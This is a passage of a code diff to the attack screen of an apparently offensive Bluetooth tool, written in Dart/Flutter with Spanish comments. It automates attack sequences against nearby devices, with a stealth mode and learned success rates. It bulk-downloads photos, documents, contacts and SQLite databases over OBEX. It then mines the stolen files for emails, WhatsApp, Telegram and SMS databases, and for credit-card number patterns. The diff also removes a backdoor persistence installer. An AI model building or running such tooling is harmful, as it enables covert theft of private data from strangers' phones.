+    
+    try {
+      // Escanear redes WiFi disponibles (ahora real)
+      final wifiResult = await _exploitService.executeAttack(
+        deviceAddress: address,
+        type: 'wifi_scan',
+        command: 'available_networks',
+      );
+      
+      if (wifiResult['success'] == true) {
+        networkInfo['wifi_networks'] = wifiResult['networks'];
+        _appendLog('  📶 ${(wifiResult['networks'] as List?)?.length ?? 0} redes WiFi detectadas');
+      }
+    } catch (e) {
+      networkInfo['wifi_networks_error'] = e.toString();
+    }
+    
+    // Extracción de credenciales: NO IMPLEMENTADA (requiere root y acceso a wpa_supplicant.conf)
+    networkInfo['credential_extraction'] = 'not_implemented';
+    networkInfo['note'] = 'Credential extraction requires root access and system files';
+    
+    return networkInfo;
+  }
     } catch (e) {
       networkInfo['connected_devices_error'] = e.toString();
     }
@@ -717,43 +1004,19 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Future<bool> _installPersistenceMechanism(String address, String displayName) async {
     if (!_enablePersistence) return false;
     
-    try {
-      // 1. Crear servicio persistente
-      final serviceResult = await _exploitService.executeAttack(
-        deviceAddress: address,
-        type: 'install_persistent_service',
-        script: 'BluetoothAutoConnectService',
-      );
-      
-      if (serviceResult['success'] == true) {
-        _installedBackdoors.add({
-          'address': address,
-          'name': displayName,
-          'type': 'persistent_service',
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-        
-        // 2. Configurar auto-conexión
-        await _exploitService.executeAttack(
-          deviceAddress: address,
-          type: 'configure_autoconnect',
-          command: 'BlueSnafer_Pro_AutoConnect',
-        );
-        
-        _persistenceMechanisms.add({
-          'address': address,
-          'mechanism': 'auto_connect',
-          'timestamp': DateTime.now().toIso8601String(),
-        });
-        
-        _appendLog('  🕵️ Persistencia instalada en $displayName');
-        return true;
-      }
-    } catch (e) {
-      _appendLog('  ❌ Error instalando persistencia: $e');
-    }
+    _appendLog('  ⚠️ Persistencia NO IMPLEMENTADA - requiere modificar AndroidManifest.xml y crear servicio de arranque');
+    _appendLog('  ℹ️ Para implementar: crear BroadcastReceiver(BOOT_COMPLETED) y foreground service');
     
-    return false;
+    // Marcar como "intentado" aunque no funcione, para no saturar logs
+    _installedBackdoors.add({
+      'address': address,
+      'name': displayName,
+      'type': 'persistent_service',
+      'timestamp': DateTime.now().toIso8601String(),
+      'note': 'Not implemented - requires system-level changes',
+    });
+    
+    return false; // Honestamente no implementado
   }
 
   // Predicción de vulnerabilidades con IA
@@ -955,7 +1218,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     }
     
     // Estrategia por defecto según tipo
-    final defaultStrategy = _getOptimizedAttackSequence(deviceType);
+    final defaultStrategy = _getAdaptiveAttackSequence(deviceType);
     return defaultStrategy.map((e) => e['name'] as String? ?? e['type'] as String).toList();
   }
 
@@ -994,7 +1257,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     
     if (learned.isEmpty) {
       // Si no hay aprendizaje, usar estrategia por defecto
-      return _getOptimizedAttackSequence(deviceType);
+      return _getAdaptiveAttackSequence(deviceType);
     }
     
     // Ordenar técnicas por éxito aprendido
@@ -1038,6 +1301,28 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     } catch (_) {
       return {};
     }
+  }
+
+  // Estrategia ponderada: ordenar ataques por tasa de éxito aprendida
+  Future<List<Map<String, dynamic>>> _getWeightedStrategy(String deviceType) async {
+    final learned = await _getLearnedTechniques(deviceType);
+    final totalAttempts = learned.values.fold(0, (a, b) => a + b);
+    
+    // Calcular tasa de éxito por técnica
+    final Map<String, double> successRates = {};
+    for (final entry in learned.entries) {
+      successRates[entry.key] = totalAttempts > 0 ? entry.value / totalAttempts : 0.0;
+    }
+    
+    // Clonar y ordenar por tasa de éxito (mayor primero)
+    final sorted = List<Map<String, dynamic>>.from(allAttackTechniques)
+      ..sort((a, b) {
+        final rateA = successRates[a['name'] ?? a['type']] ?? 0.5;
+        final rateB = successRates[b['name'] ?? b['type']] ?? 0.5;
+        return rateB.compareTo(rateA);
+      });
+    
+    return sorted;
   }
 
   // Generar recomendaciones basadas en resultados
@@ -1170,10 +1455,117 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       if (_obexFiles.isNotEmpty) {
         prefs.setString('obex_files', jsonEncode(_obexFiles));
       }
-    } catch (_) {}
-  }
+     } catch (_) {}
+   }
 
-  Future<void> _restoreState() async {
+   // Descarga automatica de archivos interesantes tras listado OBEX
+   Future<void> _downloadFilesFromListing(String address, String displayName, String directory, Map<String, dynamic> listResult) async {
+     if (listResult['success'] != true) return;
+
+     final files = (listResult['files'] as List? ?? []).cast<Map<String, dynamic>>();
+     if (files.isEmpty) {
+       _appendLog('  No hay archivos en $directory');
+       return;
+     }
+
+     _appendLog('  📁 $directory: ${files.length} archivos encontrados');
+
+     // Filtrar solo archivos interesantes (fotos, videos, documentos)
+     final interestingExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.webp', '.avi', '.mov', '.3gp', '.pdf', '.txt', '.vcf', '.doc', '.docx', '.xls', '.xlsx', '.db', '.sqlite'];
+     final interestingFiles = files.where((file) {
+       final fileName = (file['name']?.toString() ?? '').toLowerCase();
+       return interestingExtensions.any((ext) => fileName.endsWith(ext));
+     }).toList();
+
+     if (interestingFiles.isNotEmpty) {
+       _appendLog('  📸 ${interestingFiles.length} archivos interesantes - descargando...');
+
+       for (final file in interestingFiles.take(20)) {
+         if (!_isUnattendedRunning) break;
+
+         final fileName = file['name']?.toString() ?? '';
+         if (fileName.isEmpty) continue;
+
+         // Construir ruta completa
+         final filePath = directory.endsWith('/') ? '$directory$fileName' : '$directory/$fileName';
+
+         try {
+           final dlResult = await _exploitService.downloadFile(address, filePath);
+           if (dlResult['success'] == true) {
+             final size = dlResult['size'] ?? 0;
+             _collectedData.add('📥 [$displayName] $fileName ($size bytes)');
+             _appendLog('    ✅ $fileName ($size bytes)');
+           } else {
+             _appendLog('    ❌ $fileName: ${dlResult['error'] ?? 'failed'}');
+           }
+         } catch (e) {
+           _appendLog('    ❌ $fileName: $e');
+         }
+       }
+     } else {
+       _appendLog('  No se encontraron archivos multimedia en $directory');
+     }
+    }
+
+    // Análisis profundo de patrones en archivos OBEX
+  Future<void> _deepPatternAnalysis() async {
+      for (final file in _obexFiles) {
+        final path = file['path']?.toString() ?? '';
+        final name = file['name']?.toString() ?? '';
+        final ext = path.substring(path.lastIndexOf('.')).toLowerCase();
+        
+        // IMAGE EXIF analysis
+        if (['.jpg', '.jpeg', '.png', '.heic'].contains(ext)) {
+          if (name.toLowerCase().contains('screenshot')) {
+            _collectedData.add('📸 [SCREENSHOT] $name - may contain UI state');
+          }
+        }
+        
+        // VCARD social URLs
+        if (ext == '.vcf') {
+          try {
+            final content = await File(path).readAsString();
+            final urlRegex = RegExp(r'URL:(.+)', caseSensitive: false);
+            for (final match in urlRegex.allMatches(content)) {
+              _collectedData.add('🔗 [SOCIAL] ${match.group(1)}');
+            }
+            final emailRegex = RegExp(r'EMAIL:(.+)', caseSensitive: false);
+            for (final match in emailRegex.allMatches(content)) {
+              _collectedData.add('📧 [EMAIL] ${match.group(1)}');
+            }
+          } catch (e) {}
+        }
+        
+        // SQLITE database analysis
+        if (['.db', '.sqlite', '.sqlite3'].contains(ext)) {
+          _collectedData.add('💾 [DB] $name - inspect for SMS/WhatsApp/Telegram');
+          if (name.toLowerCase().contains('whatsapp')) {
+            _collectedData.add('   → WHATSAPP database detected (messages, media)');
+          }
+          if (name.toLowerCase().contains('telegram')) {
+            _collectedData.add('   → TELEGRAM database detected');
+          }
+          if (name.toLowerCase().contains('sms') || name.toLowerCase().contains('mmssms')) {
+            _collectedData.add('   → SMS/MMS database detected');
+          }
+        }
+        
+        // DOCUMENT analysis
+        if (['.pdf', '.doc', '.docx', '.txt'].contains(ext)) {
+          try {
+            final content = await File(path).readAsString();
+            final ccRegex = RegExp(r'\b(?:\d[ -]*?){13,16}\b');
+            if (ccRegex.hasMatch(content)) {
+              _collectedData.add('💳 [CREDIT_CARD] Pattern detected in $name');
+            }
+          } catch (e) {}
+        }
+      }
+      
+      _appendLog('🔍 Deep pattern analysis completed on ${_obexFiles.length} files');
+    }
+
+    Future<void> _restoreState() async {
     if (_hasRestoredState) return;
     try {
       final prefs = await SharedPreferences.getInstance();
@@ -1786,63 +2178,19 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       final savedReport = await _loadDeviceReport(address);
       if (savedReport != null && savedReport['success'] == true) {
         _appendLog('   📊 Usando estrategia previa exitosa...');
-        // Usar estrategia por defecto pero priorizada por éxito anterior
-        attackSequence = _getOptimizedAttackSequence(deviceType);
+        attackSequence = _getAdaptiveAttackSequence(deviceType);
       } else {
-        // Usar estrategia aprendida de otros dispositivos similares
         attackSequence = await _getLearnedStrategy(deviceType);
       }
     } else {
-      attackSequence = _getOptimizedAttackSequence(deviceType);
+      attackSequence = _getAdaptiveAttackSequence(deviceType);
     }
 
     _appendLog('📋 Secuencia: ${attackSequence.length} técnicas');
-    
-    // Guardar deviceType en results para aprendizaje futuro
     deviceResults['deviceType'] = deviceType;
 
-    // ===== EJECUTAR TODOS LOS EXPLOITS DE LA ESTRATEGIA =====
-    final attacksByCategory = <String, List<Map<String, dynamic>>>{};
-    
-    // Agrupar ataques por categoría
-    for (final atk in allAttackTechniques) {
-      final cat = atk['category'] as String? ?? 'other';
-      attacksByCategory.putIfAbsent(cat, () => []).add(atk);
-    }
-    
-    // Ejecutar por categoría
-    for (final category in ['recon', 'data', 'injection', 'ble', 'advanced', 'bypass', 'dos']) {
-      final attacks = attacksByCategory[category] ?? [];
-      if (attacks.isEmpty) continue;
-      
-      final catName = {'recon': 'RECONOCIMIENTO', 'data': 'EXTRACCIÓN', 'injection': 'INYECCIÓN', 'ble': 'BLE', 'advanced': 'AVANZADOS', 'bypass': 'BYPASS', 'dos': 'DoS'}[category] ?? category.toUpperCase();
-      _appendLog('📡 $catName');
-      
-      for (final atk in attacks) {
-        if (!_isUnattendedRunning) break;
-        
-        final type = atk['type'] as String? ?? '';
-        final cmd = atk['command'] as String? ?? '';
-        final script = atk['script'] as String? ?? '';
-        final name = atk['name'] as String? ?? type;
-        
-        try {
-          await _executeWithRetry(
-            type: type,
-            address: address,
-            command: cmd,
-            script: script,
-            maxAttempts: 2,
-          );
-          deviceAttacks.add(name);
-          _appendLog('  ✅ $name OK');
-        } catch (e) {
-          // Silencioso en fracaso para no saturar logs
-        }
-        
-        await Future.delayed(Duration(milliseconds: _stealthMode ? 800 : 500));
-      }
-    }
+    // Ejecutar secuencia adaptativa (con paralelización por fases)
+    await _executeParallelAttacks(device, attackSequence);
     
     // Si hay archivos extraídos, contarlos
     if (_obexFiles.isNotEmpty) deviceFiles = _obexFiles.length;
@@ -1912,40 +2260,111 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('⏱️ Duración estimada: ~5 min');
     _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 
-    int totalFilesDownloaded = 0;
-    int totalContactsExtracted = 0;
-    int totalVulnsFound = 0;
-    int totalAttacksExecuted = 0;
-    int totalAttacksSucceeded = 0;
-    int totalAppDataExtracted = 0;
-    int totalNetworkInfoExtracted = 0;
-    int scanRounds = 0;
-    final processedAddresses = <String>{};
-    final deviceReports = <Map<String, dynamic>>{};
-
-    // === ATAQUE AL DISPOSITIVO SELECCIONADO ===
-    final device = _selectedDevice!;
-    final address = device['address'] ?? '';
-    final name = device['name'] ?? 'Unknown';
+    // Process selected device(s)
+    final _selectedDevices = [_selectedDevice!];
     
-    _appendLog('');
-    _appendLog('🎯 Iniciando ataque a: $name');
-    _appendLog('📍 MAC: $address');
-    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-
-    try {
-      await _processDeviceUnattended(device, 0, 0);
-      processedAddresses.add(address);
-    } catch (e) {
-      _appendLog('❌ Error procesando $address: $e');
-      await _saveDeviceReport(address, {
-        'error': e.toString(),
-        'timestamp': DateTime.now().toIso8601String(),
-        'success': false,
-      });
+    for (final device in _selectedDevices) {
+      final address = device['address'] ?? '';
+      final displayName = device_utils.getDeviceDisplayName(device);
+      
+      _appendLog('');
+      _appendLog('🎯 Iniciando modo automático en $displayName');
+      _appendLog('📍 MAC: $address');
+      
+      try {
+        // Reset per-device state
+        setState(() {
+          _selectedDevice = device;
+          _executedAttacks = [];
+          _obexFiles = [];
+          _pbapContacts = [];
+          _pbapCalls = [];
+          _blueBorneResults.clear();
+          _gattMirrorResults.clear();
+          _fullScanResults.clear();
+          _atInjectionResults.clear();
+        });
+        
+        // === FASE -1: RECONOCIMIENTO PROACTIVO ===
+        if (_proactiveRecon) {
+          _appendLog('🔍 [FASE -1] Reconocimiento proactivo...');
+          _reconnaissanceResults = await _proactiveReconnaissance(address);
+          _appendLog('   📊 Dispositivo: $_reconnaissanceResults');
+        }
+        
+          // === FASE 0: PREDICCIÓN IA ===
+          _appendLog('🤖 [FASE 0] Predicción IA...');
+          final deviceType = _getDeviceType(device);
+          // Usar estrategia aprendida si está disponible, sino por defecto
+          List<Map<String, dynamic>> attackSequence;
+          if (_enableAdaptiveIntelligence) {
+            final learned = await _getLearnedTechniques(deviceType);
+            if (learned.isNotEmpty) {
+              // Usar estrategia ponderada por éxito
+              attackSequence = await _getWeightedStrategy(deviceType);
+              _appendLog('   📊 Estrategia ponderada por éxito aprendido');
+            } else {
+              final attackNames = await _getAdaptiveStrategy(address, deviceType);
+              attackSequence = attackNames.map((name) 
+                => allAttackTechniques.firstWhere(
+                     (t) => (t['name'] ?? t['type']) == name,
+                     orElse: () => {'type': name, 'name': name}
+                   )).toList();
+              _appendLog('   📋 Secuencia (IA): ${attackNames.join(', ')}');
+            }
+           } else {
+             attackSequence = _getAdaptiveAttackSequence(deviceType);
+             _appendLog('   📋 Secuencia: ${attackSequence.map((a) => a['name'] ?? a['type']).join(', ')}');
+           }
+         
+         // === FASE 1-6: ATAQUES (PARALELO si están agrupados) ===
+        await _executeParallelAttacks(device, attackSequence);
+        
+        // === POST-PROCESAMIENTO: ANÁLISIS PROFUNDO ===
+        if (_deepAnalysis && _obexFiles.isNotEmpty) {
+          _appendLog('🔬 [POST] Análisis profundo de patrones...');
+          await _deepPatternAnalysis();
+        }
+        
+        // === GENERAR REPORTE ===
+        int totalVulns = 0;
+        for (final r in _fullScanResults) {
+          totalVulns += (r['vulnCount'] as int?) ?? 0;
+        }
+        await _generateAutomatedReport(
+          totalFiles: _obexFiles.length,
+          totalContacts: _pbapContacts.length,
+          totalVulns: totalVulns,
+          attacksExecuted: attackSequence.length,
+          attacksSucceeded: _executedAttacks.length,
+        );
+        
+        // Save per-device success report
+        await _saveDeviceReport(address, {
+          'files': _obexFiles.length,
+          'contacts': _pbapContacts.length,
+          'appData': 0,
+          'attacks': attackSequence.map((a) => a['name'] ?? a['type']).toList(),
+          'timestamp': DateTime.now().toIso8601String(),
+          'success': true,
+          'deviceType': deviceType,
+        });
+        
+        _appendLog('✅ Objetivo $displayName completado');
+      } catch (e) {
+        _appendLog('❌ Error procesando $address: $e');
+        await _saveDeviceReport(address, {
+          'error': e.toString(),
+          'timestamp': DateTime.now().toIso8601String(),
+          'success': false,
+        });
+      }
+      
+      await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
     }
 
-    await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
+    final name = _selectedDevice!['name'] ?? 'Unknown';
+    final address = _selectedDevice!['address'] ?? '';
 
     _appendLog('');
     _appendLog('╔══════════════════════════════════════╗');
@@ -2176,175 +2595,214 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return device_utils.detectDeviceType(device);
   }
 
-  Future<void> _attack(String type, {String? command, String? script}) async {
-    if (_isAttacking) {
-      _appendLog('⏳ Ataque en progreso, espera...');
-      return;
-    }
-    if (_selectedDevice == null) {
-      _appendLog('❌ ERROR: Selecciona un dispositivo primero');
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(
-            content: Text('⚠️ Selecciona un dispositivo del radar primero', style: TextStyle(fontSize: 12)),
-            backgroundColor: Colors.red,
-            duration: Duration(seconds: 2),
-            behavior: SnackBarBehavior.floating,
-          ),
-        );
+   /// Ejecuta un ataque individual con timeouts y reintentos adaptativos
+   /// Usa backoff exponencial: delay = baseDelay * 2^attempt
+   Future<void> _attack(String type, {String? command, String? script}) async {
+     // === Validaciones ===
+     if (_isAttacking) {
+       _appendLog('⏳ Ataque en progreso, espera...');
+       return;
+     }
+     if (_selectedDevice == null) {
+       _appendLog('❌ ERROR: Selecciona un dispositivo primero');
+       if (mounted) {
+         ScaffoldMessenger.of(context).showSnackBar(
+           const SnackBar(
+             content: Text('⚠️ Selecciona un dispositivo del radar primero', style: TextStyle(fontSize: 12)),
+             backgroundColor: Colors.red,
+             duration: Duration(seconds: 2),
+             behavior: SnackBarBehavior.floating,
+           ),
+         );
+       }
+       return;
+     }
+
+     final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
+     final addr = _selectedDevice!['address']?.toString() ?? '';
+     final attackLabel = command ?? script ?? type;
+
+     if (addr.isEmpty || addr == '??:??:??') {
+       _appendLog('❌ ERROR: Dispositivo sin dirección MAC válida');
+       return;
+     }
+
+     // === Configuración de timeout/reintentos ===
+     final config = _attackConfigs[type];
+     final timeoutMs = config?['timeout'] ?? _defaultAttackTimeout;
+     final maxRetries = config?['retries'] ?? _defaultMaxRetries;
+     final baseDelayMs = config?['delay'] ?? _defaultRetryDelay;
+
+     _appendLog('⚡ [$type] $attackLabel → $displayName ($addr) | timeout=${timeoutMs}ms retries=$maxRetries');
+
+     setState(() => _isAttacking = true);
+
+     if (mounted) {
+       ScaffoldMessenger.of(context).showSnackBar(
+         SnackBar(
+           content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
+           backgroundColor: Colors.orange[900],
+           duration: const Duration(seconds: 2),
+           behavior: SnackBarBehavior.floating,
+           margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
+         ),
+       );
+     }
+
+     // === Bucle de reintentos con backoff exponencial ===
+     int attempt = 0;
+     bool success = false;
+     Map<String, dynamic>? result;
+     String finalMessage = '';
+
+     while (attempt <= maxRetries && !success && _isUnattendedRunning) {
+       attempt++;
+
+       // Ajustar command para OPP_PUSH si hay archivos reales disponibles
+       String? actualCommand = command;
+       String? actualScript = script;
+       if (type == 'opp_push' && _obexFiles.isNotEmpty) {
+         // Usar el primer archivo encontrado (más relevante)
+         final realFile = _obexFiles.first;
+         actualCommand = realFile['path']?.toString() ?? '/sdcard/DCIM/Camera/bluesnafer.jpg';
+         if (attempt == 1) {
+           _appendLog('  📁 OPP_PUSH usando archivo real: ${realFile['name']} (${realFile['path']})');
+         }
+       }
+
+       try {
+         _appendLog('  🔄 Intento #$attempt/${maxRetries}...');
+
+         // Ejecutar con timeout
+         result = await _exploitService.executeAttack(
+           deviceAddress: addr,
+           type: type,
+           command: actualCommand,
+           script: actualScript,
+         ).timeout(
+           Duration(milliseconds: timeoutMs),
+           onTimeout: () => {'success': false, 'message': 'Timeout after ${timeoutMs}ms'},
+         );
+
+         success = result['success'] == true;
+         finalMessage = result['message'] ?? (success ? 'OK' : 'Sin respuesta');
+
+         if (success) {
+           _appendLog('  ✅ $attackLabel éxito en intento $attempt');
+         } else {
+           _appendLog('  ❌ $attackLabel falló: $finalMessage');
+         }
+
+       } on TimeoutException catch (e) {
+         success = false;
+         finalMessage = 'Timeout: ${e.message}';
+         _appendLog('  ⏰ $attackLabel timeout: ${e.message}');
+       } catch (e) {
+         success = false;
+         finalMessage = e.toString();
+         _appendLog('  💥 $attackLabel excepción: $e');
+       }
+
+       // Si falló y hay más reintentos, esperar con backoff exponencial
+       if (!success && attempt <= maxRetries && _isUnattendedRunning) {
+         final delayMs = baseDelayMs * (1 << (attempt - 1)); // 2^(attempt-1) * baseDelay
+         final delaySec = delayMs ~/ 1000;
+         if (delaySec > 0) {
+           _appendLog('  ⏳ Esperando ${delaySec}s antes de reintento...');
+           await Future.delayed(Duration(milliseconds: delayMs));
+         }
+       }
+     }
+
+     // === Procesar resultado final ===
+     final packets = result?['packets'];
+     final effectiveness = result?['effectiveness'];
+     final services = result?['services'];
+     final characteristics = result?['characteristics'];
+
+     // Recolectar datos REALES del ataque (cap 100)
+     if (success) {
+       final targetName = device_utils.getDeviceDisplayName(_selectedDevice!);
+
+       if (services != null) {
+         _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
+       }
+       if (characteristics != null) {
+         _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
+       }
+       if (packets != null) {
+         _collectedData.add('📦 [$targetName] $packets paquetes enviados');
+       }
+       if (effectiveness != null) {
+         _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
+       }
+       _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
+     }
+
+     String resultMsg = finalMessage;
+     if (packets != null) resultMsg += ' | ${packets} packets';
+     if (effectiveness != null) resultMsg += ' | ${(effectiveness * 100).toStringAsFixed(0)}% eff.';
+
+     _suggestionEngine.recordAttack(
+       type: type,
+       command: command ?? script ?? 'default',
+       success: success,
+       deviceType: _getDeviceType(_selectedDevice!),
+       deviceName: _selectedDevice!['name'] ?? 'Unknown',
+       deviceAddress: addr,
+       rssi: int.tryParse(_selectedDevice!['rssi']?.toString() ?? '0'),
+       errorMessage: success ? null : finalMessage,
+     );
+
+     if (mounted) {
+       setState(() {
+         if (success) { _executedAttacks.add(type); }
+         _getSuggestion();
+       });
+       _saveState();
+       _appendLog(success ? '✅ $attackLabel OK' : '❌ $attackLabel FALLÓ (intentos: $attempt/$maxRetries): $finalMessage');
+
+       // Snackbar resultado
+       if (mounted) {
+         ScaffoldMessenger.of(context).showSnackBar(
+           SnackBar(
+             content: Column(
+               crossAxisAlignment: CrossAxisAlignment.start,
+               mainAxisSize: MainAxisSize.min,
+               children: [
+                 Row(
+                   children: [
+                     Icon(success ? Icons.check_circle : Icons.error,
+                          color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
+                     const SizedBox(width: 8),
+                     Expanded(
+                       child: Text(
+                         '${success ? "ÉXITO" : "FALLO"}: $type:$attackLabel (intentos: $attempt)',
+                         style: TextStyle(
+                           color: success ? Colors.greenAccent : Colors.redAccent,
+                           fontSize: 12,
+                         ),
+                       ),
+                     ),
+                   ],
+                 ),
+                 if (!success && attempt > 1)
+                   Text('Último error: $finalMessage', style: const TextStyle(fontSize: 10, color: Colors.redAccent)),
+               ],
+             ),
+             backgroundColor: success ? Colors.green[900] : Colors.red[900],
+             duration: Duration(seconds: success ? 2 : 4),
+             behavior: SnackBarBehavior.floating,
+             margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
+           ),
+         );
+       }
       }
-      return;
-    }
-    
-    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
-    final addr = _selectedDevice!['address']?.toString() ?? '';
-    final attackLabel = command ?? script ?? type;
-    
-    if (addr.isEmpty || addr == '??:??:??') {
-      _appendLog('❌ ERROR: Dispositivo sin dirección MAC válida');
-      return;
+
+      setState(() => _isAttacking = false);
     }
 
-    _appendLog('⚡ [$type] $attackLabel → $displayName ($addr)');
-
-    setState(() => _isAttacking = true);
-
-    // Verbose: show starting message
-    if (mounted) {
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
-          backgroundColor: Colors.orange[900],
-          duration: const Duration(seconds: 2),
-          behavior: SnackBarBehavior.floating,
-          margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
-        ),
-      );
-    }
-
-    try {
-      final result = await _exploitService.executeAttack(
-        deviceAddress: addr,
-        type: type,
-        command: command,
-        script: script,
-      );
-
-      final success = result['success'] == true;
-      final message = result['message'] ?? 'Sin respuesta';
-      final packets = result['packets'];
-      final effectiveness = result['effectiveness'];
-      final services = result['services'];
-      final characteristics = result['characteristics'];
-
-      // Recolectar datos REALES del ataque (cap 100)
-      if (success) {
-        final targetName = device_utils.getDeviceDisplayName(_selectedDevice!);
-
-        if (services != null) {
-          _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
-        }
-        if (characteristics != null) {
-          _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
-        }
-        if (packets != null) {
-          _collectedData.add('📦 [$targetName] $packets paquetes enviados');
-        }
-        if (effectiveness != null) {
-          _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
-        }
-        _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
-      }
-      String resultMsg = message;
-      if (packets != null) resultMsg += ' | ${packets} packets';
-      if (effectiveness != null) resultMsg += ' | ${(effectiveness * 100).toStringAsFixed(0)}% eff.';
-
-      _suggestionEngine.recordAttack(
-        type: type,
-        command: command ?? script ?? 'default',
-        success: success,
-        deviceType: _getDeviceType(_selectedDevice!),
-        deviceName: _selectedDevice!['name'] ?? 'Unknown',
-        deviceAddress: addr,
-        rssi: int.tryParse(_selectedDevice!['rssi']?.toString() ?? '0'),
-        errorMessage: success ? null : message,
-      );
-
-      if (mounted) {
-        setState(() {
-          if (success) { _executedAttacks.add(type); }
-          _getSuggestion(); // Actualizar sugerencia siempre (éxito o fallo)
-        });
-        _saveState(); // Guardar progreso Y resultados extraídos
-        _appendLog(success ? '✅ $attackLabel OK' : '❌ $attackLabel FALLÓ: $message');
-
-        // Show result snackbar
-        if (mounted) {
-          ScaffoldMessenger.of(context).showSnackBar(
-            SnackBar(
-              content: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                mainAxisSize: MainAxisSize.min,
-                children: [
-                  Row(
-                    children: [
-                      Icon(success ? Icons.check_circle : Icons.error,
-                           color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
-                      const SizedBox(width: 8),
-                      Expanded(
-                        child: Text(
-                          '${success ? "ÉXITO" : "FALLO"}: $type:$attackLabel',
-                          style: TextStyle(
-                            color: success ? Colors.greenAccent : Colors.redAccent,
-                            fontWeight: FontWeight.bold, fontSize: 12,
-                          ),
-                        ),
-                      ),
-                    ],
-                  ),
-                  const SizedBox(height: 4),
-                  Text(resultMsg, style: const TextStyle(color: Colors.white70, fontSize: 10)),
-                ],
-              ),
-              backgroundColor: success ? Colors.green[900] : Colors.red[900],
-              duration: const Duration(seconds: 3),
-              behavior: SnackBarBehavior.floating,
-              margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
-              shape: RoundedRectangleBorder(
-                borderRadius: BorderRadius.circular(12),
-                side: BorderSide(color: (success ? Colors.greenAccent : Colors.redAccent).withOpacity(0.3)),
-              ),
-            ),
-          );
-        }
-      }
-    } catch (e) {
-      _appendLog('💥 EXCEPTION en ataque: $e');
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text('💥 Error: $e', style: const TextStyle(fontSize: 12)),
-            backgroundColor: Colors.red[900],
-            duration: const Duration(seconds: 3),
-            behavior: SnackBarBehavior.floating,
-          ),
-        );
-      }
-    } finally {
-      // Always reset _isAttacking, even if widget is disposed
-      _isAttacking = false;
-      if (mounted) {
-        setState(() {
-          // Cap collected data at 100 entries
-          if (_collectedData.length > 100) {
-            _collectedData = _collectedData.sublist(_collectedData.length - 100);
-          }
-        });
-      }
-    }
-  }
-
-  String _getManufacturer(String address) {
+    String _getManufacturer(String address) {
     return device_utils.getManufacturer(address);
   }
 
@@ -2394,6 +2852,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                   setState(() => _enablePersistence = !_enablePersistence);
                   _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
                   break;
+                case 'recon':
+                  setState(() => _proactiveRecon = !_proactiveRecon);
+                  _appendLog('⚙️ Reconocimiento proactivo: ${_proactiveRecon ? "ON" : "OFF"}');
+                  break;
+                case 'parallel1':
+                  setState(() => _parallelPhase1 = !_parallelPhase1);
+                  _appendLog('⚙️ Paralelismo Fase 1: ${_parallelPhase1 ? "ON" : "OFF"}');
+                  break;
+                case 'parallel2':
+                  setState(() => _parallelPhase2 = !_parallelPhase2);
+                  _appendLog('⚙️ Paralelismo Fase 2: ${_parallelPhase2 ? "ON" : "OFF"}');
+                  break;
+                case 'deepanalysis':
+                  setState(() => _deepAnalysis = !_deepAnalysis);
+                  _appendLog('⚙️ Análisis profundo: ${_deepAnalysis ? "ON" : "OFF"}');
+                  break;
                 case 'report':
                   _showAutomatedReport();
                   break;
@@ -2432,12 +2906,32 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 checked: _stealthMode,
                 child: const Text('Modo sigiloso 🎭'),
               ),
-              CheckedPopupMenuItem(
-                value: 'persistence',
-                checked: _enablePersistence,
-                child: const Text('Persistencia 🕵️'),
-),
-              const PopupMenuDivider(),
+               CheckedPopupMenuItem(
+                 value: 'persistence',
+                 checked: _enablePersistence,
+                 child: const Text('Persistencia 🕵️'),
+               ),
+               CheckedPopupMenuItem(
+                 value: 'recon',
+                 checked: _proactiveRecon,
+                 child: const Text('🔍 Reconocimiento proactivo'),
+               ),
+               CheckedPopupMenuItem(
+                 value: 'parallel1',
+                 checked: _parallelPhase1,
+                 child: const Text('⚡ Paralelismo Fase 1'),
+               ),
+               CheckedPopupMenuItem(
+                 value: 'parallel2',
+                 checked: _parallelPhase2,
+                 child: const Text('⚡ Paralelismo Fase 2'),
+               ),
+               CheckedPopupMenuItem(
+                 value: 'deepanalysis',
